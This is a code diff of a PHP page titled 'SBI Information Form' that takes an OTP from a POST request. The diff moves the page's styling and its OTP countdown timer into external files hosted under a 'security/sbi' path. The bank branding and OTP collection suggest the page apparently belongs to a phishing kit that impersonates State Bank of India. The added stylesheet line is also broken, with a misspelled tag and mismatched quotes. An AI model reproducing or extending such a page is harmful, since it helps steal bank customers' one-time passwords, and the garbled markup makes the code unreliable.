@@ -31,111 +31,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBI Information Form</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #e5e5e5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            padding: 0 20px;
-        }
+     <linl rel="stylesheet" href='https://mrfidal.github.io/security/sbi/style.css">
 
-        .container {
-            background: #fff;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 400px;
-            box-sizing: border-box;
-        }
 
-        .header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
 
-        .header img {
-            width: 40px;
-            margin-right: 10px;
-        }
-
-        h1 {
-            color: #003a70;
-            font-size: 24px;
-            margin: 0;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #333;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #003a70;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        button:hover {
-            background-color: #002a50;
-        }
-
-        #message {
-            text-align: center;
-            margin-top: 10px;
-            color: red;
-        }
-
-        .otp-container {
-            display: none;
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        #timer {
-            margin-top: 10px;
-            font-weight: bold;
-            color: #003a70;
-        }
-
-        @media (max-width: 480px) {
-            .container {
-                padding: 20px;
-            }
-
-            h1 {
-                font-size: 20px;
-            }
-
-            input, button {
-                padding: 12px;
-            }
-        }
-    </style>
 </head>
 <body>
     <div class="container">
@@ -184,33 +83,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
         <?php endif; ?>
     </div>
 
-    <script>
-        let countdown;
-        let timerDisplay = document.getElementById("timer");
+    <script src="https://mrfidal.github.io/security/sbi/script.js">
 
-        function startTimer(duration) {
-            let timer = duration, minutes, seconds;
-            countdown = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-
-                timerDisplay.textContent = minutes + ":" + seconds;
-
-                if (--timer < 0) {
-                    clearInterval(countdown);
-                    timerDisplay.textContent = "Time's up!";
-                    document.getElementById("otpContainer").style.display = "none"; 
-                }
-            }, 1000);
-        }
-
-        <?php if (isset($showOtpForm)): ?>
-            document.getElementById("otpContainer").style.display = "block";
-            startTimer(300);
-        <?php endif; ?>
     </script>
 </body>
 </html>
